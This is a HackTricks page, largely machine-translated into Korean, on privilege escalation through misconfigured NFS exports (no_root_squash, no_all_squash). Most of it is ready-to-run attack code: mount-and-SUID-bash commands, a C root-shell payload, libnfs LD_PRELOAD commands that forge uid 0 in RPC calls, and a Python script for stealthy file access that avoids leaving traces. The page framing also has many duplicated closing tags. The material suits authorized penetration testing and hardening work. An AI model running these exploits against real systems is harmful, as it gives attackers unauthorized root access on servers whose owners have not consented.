{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


_read the_ **/etc/exports** _파일을 읽어보세요. 만약 **no\_root\_squash**로 설정된 디렉토리를 찾으면, 클라이언트로서 해당 디렉토리에 **접근**하고 마치 로컬 **root**인 것처럼 그 안에 **쓰기** 할 수 있습니다._

**no\_root\_squash**: 이 옵션은 기본적으로 클라이언트의 root 사용자에게 NFS 서버의 파일에 root로 접근할 수 있는 권한을 부여합니다. 이는 심각한 보안 문제를 초래할 수 있습니다.

**no\_all\_squash:** 이 옵션은 **no\_root\_squash**와 유사하지만 **비루트 사용자**에게 적용됩니다. 예를 들어, nobody 사용자로 쉘을 가지고 있고, /etc/exports 파일을 확인했으며, no\_all\_squash 옵션이 존재하고, /etc/passwd 파일을 확인한 후 비루트 사용자를 에뮬레이트하고, 해당 사용자로 suid 파일을 생성한 후(nfs를 사용하여 마운트) nobody 사용자로 suid를 실행하여 다른 사용자로 변환할 수 있습니다.

# Privilege Escalation

## Remote Exploit

이 취약점을 발견했다면, 이를 악용할 수 있습니다:

* 클라이언트 머신에서 해당 디렉토리를 **마운트**하고, **root로** 마운트된 폴더 안에 **/bin/bash** 바이너리를 복사한 후 **SUID** 권한을 부여하고, 피해자 머신에서 그 bash 바이너리를 실행합니다.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **클라이언트 머신에서 해당 디렉토리를 마운트**하고, **루트로 복사하여** 마운트된 폴더 안에 SUID 권한을 악용할 컴파일된 페이로드를 넣고, **희생자** 머신에서 해당 바이너리를 **실행**합니다 (여기에서 일부 [C SUID 페이로드](payloads-to-execute.md#c)를 찾을 수 있습니다).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

{% hint style="info" %}
Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\
다음 트릭은 파일 `/etc/exports` **가 IP를 나타내는 경우**에 해당합니다. 이 경우 **원격 익스플로잇을 사용할 수 없으며** 이 **트릭을 악용해야 합니다**.\
익스플로잇이 작동하기 위한 또 다른 필수 조건은 **`/etc/export` 내의 export가 `insecure` 플래그를 사용해야 한다는 것입니다**.\
\--_나는 `/etc/export`가 IP 주소를 나타내는 경우 이 트릭이 작동할지 확신하지 못합니다_--
{% endhint %}

## Basic Information

이 시나리오는 로컬 머신에서 마운트된 NFS 공유를 악용하는 것으로, 클라이언트가 자신의 uid/gid를 지정할 수 있게 해주는 NFSv3 사양의 결함을 이용하여 무단 접근을 가능하게 합니다. 익스플로잇은 NFS RPC 호출을 위조할 수 있는 라이브러리인 [libnfs](https://github.com/sahlberg/libnfs)를 사용합니다.

### Compiling the Library

라이브러리 컴파일 단계는 커널 버전에 따라 조정이 필요할 수 있습니다. 이 특정 경우에는 fallocate 시스템 호출이 주석 처리되었습니다. 컴파일 과정은 다음 명령어를 포함합니다:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Exploit 수행

이 익스플로잇은 권한을 루트로 상승시키고 셸을 실행하는 간단한 C 프로그램(`pwn.c`)을 만드는 것을 포함합니다. 프로그램은 컴파일되고, 결과 바이너리(`a.out`)는 suid root로 공유에 배치되며, RPC 호출에서 uid를 위조하기 위해 `ld_nfs.so`를 사용합니다:

1. **익스플로잇 코드 컴파일:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **익스플로잇을 공유에 배치하고 uid를 위조하여 권한 수정:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **익스플로잇을 실행하여 루트 권한 획득:**
```bash
/mnt/share/a.out
#root
```

## 보너스: NFShell을 통한 은밀한 파일 접근
루트 접근이 얻어진 후, 소유권을 변경하지 않고(NFS 공유와의 상호작용에서 흔적을 남기지 않기 위해) NFS 공유와 상호작용하기 위해 Python 스크립트(nfsh.py)가 사용됩니다. 이 스크립트는 접근하는 파일의 uid와 일치하도록 조정하여 권한 문제 없이 공유의 파일과 상호작용할 수 있게 합니다:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
실행 예:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
